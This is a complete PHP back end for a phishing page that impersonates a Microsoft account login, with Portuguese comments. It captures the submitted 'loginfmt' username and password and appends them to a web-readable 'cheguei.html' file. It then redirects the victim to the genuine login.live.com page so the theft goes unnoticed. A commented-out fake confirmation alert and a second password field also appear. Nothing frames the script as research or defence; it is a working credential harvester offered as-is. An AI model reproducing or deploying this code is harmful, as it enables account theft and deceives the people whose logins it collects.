<?php
	$username=$_POST['loginfmt'];
	$password1=$_POST['passwd1'];
	//$password2 =$_POST['passwd2'];

	//$conteudos = $username.";".$password1.";".$password2."<br>";
	$conteudos = $username.";".$password1."<br>";

	$fp = fopen("cheguei.html", "a+");
	$escreve = fwrite($fp, $conteudos);
	fclose($fp);
		
	//echo "<script>window.alert('Seu e-mail ".$username." foi confirmado com sucesso!')</script>";
	
?>
<meta http-equiv='refresh' content='1;url=https://login.live.com/login.srf?'>


